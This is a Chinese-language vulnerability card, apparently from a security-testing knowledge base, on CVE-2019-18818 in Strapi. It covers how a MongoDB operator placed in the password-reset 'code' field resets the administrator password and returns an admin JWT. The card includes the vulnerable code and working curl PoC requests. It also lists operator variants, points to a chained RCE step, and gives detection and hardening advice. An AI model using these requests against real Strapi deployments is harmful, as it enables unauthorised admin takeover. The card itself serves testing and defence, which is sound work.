---
id: web-nodejs-strapi-password-reset-nosql-injection
title: Strapi 密码重置 NoSQL 注入：code 传 {"$gt":0} 重置管理员密码并获取 JWT
type: scenario
domain: web
path: web/nodejs
technique: strapi-password-reset-nosql-injection
aliases:
- CVE-2019-18818
- Strapi 密码重置注入
- resetPasswordToken $gt
- Strapi admin 接管
- MongoDB 操作符注入
tags:
- nodejs
- strapi
- nosql
- mongodb
- injection
- auth-bypass
- cve-2019-18818
- admin-takeover
cve:
- CVE-2019-18818
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Strapi < 3.0.0-beta.17.5（原文实测 3.0.0-beta.17.4）
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:02:19+08:00'
  notes: '已对照原文与 NVD 截图核对：受影响 < 3.0.0-beta.17.5、CVSS 9.8/PR:N、findOne({resetPasswordToken: code}) 注入、$gt:0 命中、返回 admin JWT、修复 diff 强转字符串均一致；affected_versions 原已设置。未验证点：PoC 未在本机执行。'
---

## 一句话结论

Strapi 3.0.0-beta.17.4 的 `/admin/auth/reset-password` 直接把请求里的 `code` 拼进 MongoDB 查询 `findOne({resetPasswordToken: code})`，没有做类型校验；把 `code` 传成 `{"$gt": 0}` 即可匹配到第一条 `resetPasswordToken` 为字符串的管理员记录，重置管理员密码并直接拿到管理员 JWT。

## 原理

- 漏洞代码：
  ```javascript
  const { password, passwordConfirmation, code } = {
    ...ctx.request.body,
    ...ctx.params,
  };
  if (!code) { return ctx.badRequest(...); }
  // ...
  const admin = await strapi
    .query('administrator', 'admin')
    .findOne({ resetPasswordToken: code });
  ```
  只检查了 `code` 是否存在，没有检查类型；对象类型会原样进入 MongoDB 查询。
- 传入 `code = {"$gt": 0}`：`$gt` 是 MongoDB 比较操作符，匹配所有"大于 0"的值。MongoDB 有严格的 BSON 类型顺序：`MinKey < Null < Numbers < Strings < Object < Array < ... < MaxKey`，任意字符串都大于数字 0，因此该查询匹配所有 `resetPasswordToken` 为字符串的记录。
- `findOne()` 返回第一条匹配记录；管理员的记录通常排在前面（或 `resetPasswordToken` 是字符串），于是后续代码把这个管理员当成"验证码对应的用户"，执行：
  ```javascript
  const data = {
    resetPasswordToken: null,
    password: await strapi.admin.services.auth.hashPassword(password),
  };
  const updatedAdmin = await strapi
    .query('administrator', 'admin')
    .update({ id: admin.id }, data);
  return ctx.send({
    jwt: strapi.admin.services.auth.createJwtToken(updatedAdmin),
    user: ...
  });
  ```
  攻击者指定的新密码被写入管理员账户，并返回有效 JWT。
- 为什么成立：`resetPasswordToken` 是"字符串/空值"字段，查询层却接受任意 JSON 类型；NoSQL 操作符注入把"相等匹配"变成了"大于匹配"，绕过了不知道验证码的限制。
- 修复：官方只改了一行，把 `code` 强转为字符串（`resetPasswordToken: \`${code}\``），使对象被序列化成字符串而不是操作符。
- 前提：目标使用 MongoDB 后端（Strapi 默认），且管理员记录存在可被 `$gt:0` 匹配的字符串 token；如果所有 token 都为 null，则该操作符不会匹配 null（Null 小于 Numbers）。原文环境成功命中。

## 触发条件

- Strapi 版本 < 3.0.0-beta.17.5（原文 3.0.0-beta.17.4）。
- `/admin/auth/reset-password` 可从外网访问，且未被 WAF 拦截 JSON 对象型 `code`。
- 后端为 MongoDB，管理员记录中存在字符串类型的 `resetPasswordToken`（例如曾触发过重置流程）。
- 攻击者能访问 Strapi 管理端（`/admin`）以使用返回的 JWT。

## 利用步骤

1. 指纹与版本：访问 `/admin/init`，读取 `strapiVersion`（原文为 `3.0.0-beta.17.4`）；也可从 `/admin` 的静态资源版本推断。
2. 构造重置请求，`code` 使用 MongoDB 操作符：
   ```json
   {"code": {"$gt": 0}, "password": "123456", "passwordConfirmation": "123456"}
   ```
3. POST 到 `/admin/auth/reset-password`；成功时返回 200 和 `jwt`、`user`（管理员）。
4. 用新密码登录 `/admin/auth/login`，或用 JWT 访问管理员 API。
5. 以管理员身份进入下一步（如插件安装 RCE，见关联卡）。

## PoC

```bash
# 1. 版本泄露
curl -s http://api-prod.target/admin/init | jq
# { "data": { "strapiVersion": "3.0.0-beta.17.4", ... } }

# 2. NoSQL 注入重置管理员密码
curl -s http://api-prod.target/admin/auth/reset-password \
  -X POST -H 'Content-Type: application/json' \
  --data '{"code":{"$gt":0},"password":"123456","passwordConfirmation":"123456"}'
# {"jwt":"eyJhbGciOiJIUzI1NiIs...","user":{"id":3,"username":"admin",...}}

# 3. 登录验证
# 浏览器访问 /admin，使用 admin / 123456
```

```javascript
// 漏洞查询等价形式
db.administrator.findOne({ resetPasswordToken: { $gt: 0 } })
// 匹配 resetPasswordToken 为字符串的第一条记录（通常是 admin）
```

说明：PoC 为原文流程的结构化复现，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体：除 `$gt` 外，`$ne: null`、`$regex: ".*"`、`$exists: true` 等操作符也可用于匹配非空 token；具体取决于字段值与 MongoDB 版本。
- 变体：修复后 `code` 被强转为字符串，传对象会变成 `"[object Object]"`，不再匹配；升级到 beta.17.5+。
- 关联：[[web-nodejs-strapi-plugin-install-command-injection]]（拿到管理员 JWT 后的插件安装 RCE）；[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（另一类 Node.js 管理端接管）。
- 边界：非 MongoDB 后端、token 全为 null、WAF 拦截对象型参数、或版本已修复时，本链不成立。

## 检测与防御

- 检测：`/admin/auth/reset-password` 请求体中出现 JSON 对象/数组类型的 `code`，或 `$gt`、`$ne`、`$regex` 等 MongoDB 操作符；同一来源在重置接口后紧跟管理员登录。
- 防御：升级 Strapi 到 3.0.0-beta.17.5+；对 `code` 做严格字符串类型校验/强转；管理端接口加 WAF 与速率限制。
- 加固：管理员账户启用 MFA；限制 `/admin` 的来源 IP；监控异常密码重置与管理员登录。

